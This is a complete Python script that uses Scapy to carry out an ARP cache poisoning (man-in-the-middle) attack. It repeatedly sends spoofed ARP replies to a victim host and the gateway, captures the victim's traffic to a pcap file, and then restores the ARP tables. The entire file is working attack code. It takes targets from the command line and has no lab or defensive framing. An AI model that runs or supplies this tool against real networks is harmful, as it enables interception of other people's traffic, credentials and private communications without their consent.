from multiprocessing import Process
from scapy.all import ARP, Ether, conf, get_if_hwaddr, send, sniff, sndrcv, srp, wrpcap

import os
import sys
import time

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"


def print_separator(separator="-", length=40) -> None:
    print(separator * length)


def get_mac(ip: str) -> str:
    ethernet = Ether(dst=BROADCAST_MAC)
    arp = ARP(op=1, pdst=ip)

    packet = ethernet / arp

    response, _ = srp(packet, timeout=2, retry=10, verbose=True)

    for _, r in response:
        return r[Ether].src

    return None


class ARPPoisoner:
    def __init__(self, victim_ip, gateway_ip, interface="eth0") -> None:
        self.victim_ip = victim_ip
        self.victim_mac = get_mac(victim_ip)

        self.gateway_ip = gateway_ip
        self.gateway_mac = get_mac(gateway_ip)

        self.interface = interface

        conf.iface = interface  # Global config of the network interface
        conf.verb = 0  # Global config of the verbosity

        print(f"Interface {self.interface} initialized:")
        print(f"Victim ({self.victim_ip}) on {self.victim_mac}")
        print(f"Gateway ({self.gateway_ip}) on {self.gateway_mac}")

        print_separator()

    def run(self):
        self.poison_thread = Process(target=self.poison)
        self.poison_thread.start()

        self.sniff_thread = Process(target=self.sniff)
        self.sniff_thread.start()

    def poison(self):
        poison_victim = ARP()

        poison_victim.op = 2  # ARP Reply
        poison_victim.psrc = self.gateway_ip
        poison_victim.pdst = self.victim_ip
        poison_victim.hwdst = self.victim_mac

        print(f"Source IP: {poison_victim.psrc}")
        print(f"Destination IP: {poison_victim.pdst}")
        print(f"Source MAC: {poison_victim.hwsrc}")
        print(f"Destination MAC: {poison_victim.hwdst}")
        print(poison_victim.summary())

        print_separator()

        poison_gateway = ARP()

        poison_gateway.op = 2  # ARP Reply
        poison_gateway.psrc = self.victim_ip
        poison_gateway.pdst = self.gateway_ip
        poison_gateway.hwdst = self.gateway_mac

        print(f"Source IP: {poison_gateway.psrc}")
        print(f"Destination IP: {poison_gateway.pdst}")
        print(f"Source MAC: {poison_gateway.hwsrc}")
        print(f"Destination MAC: {poison_gateway.hwdst}")
        print(poison_gateway.summary())

        print_separator()

        print("Inicializing ARP Poisoning.")
        print("Press [CTRL-C] to interrupt.")

        while True:
            sys.stdout.write(".")
            sys.stdout.flush()

            try:
                send(poison_victim)
                send(poison_gateway)
            except KeyboardInterrupt:
                self.restore()
                self.poison_thread.terminate()
                sys.exit()
            else:
                time.sleep(2)

    def sniff(self, count=100):
        time.sleep(5)
        print(f"Capturing {count} packets ...")

        filter = "ip host %s" % self.victim_ip
        packets = sniff(count=count, filter=filter, iface=self.interface)

        wrpcap("arp_poison.pcap", packets)

        print("Packets received.")

        self.restore()
        self.poison_thread.terminate()

        print("Done.")

    def restore(self):
        print("Restoring ARP tables ...")

        restore_victim = ARP()

        restore_victim.psrc = self.gateway_ip
        restore_victim.pdst = self.victim_ip
        restore_victim.hwsrc = self.gateway_mac
        restore_victim.hwdst = BROADCAST_MAC

        restore_gateway = ARP()

        restore_gateway.psrc = self.victim_ip
        restore_gateway.pdst = self.gateway_ip
        restore_gateway.hwsrc = self.victim_mac
        restore_gateway.hwdst = BROADCAST_MAC

        send(restore_victim, count=5)
        send(restore_gateway, count=5)


def main():
    victim_ip, gateway_ip, interface = sys.argv[1], sys.argv[2], sys.argv[3]

    arp_poisoner = ARPPoisoner(victim_ip, gateway_ip, interface)
    arp_poisoner.run()


if __name__ == "__main__":
    main()
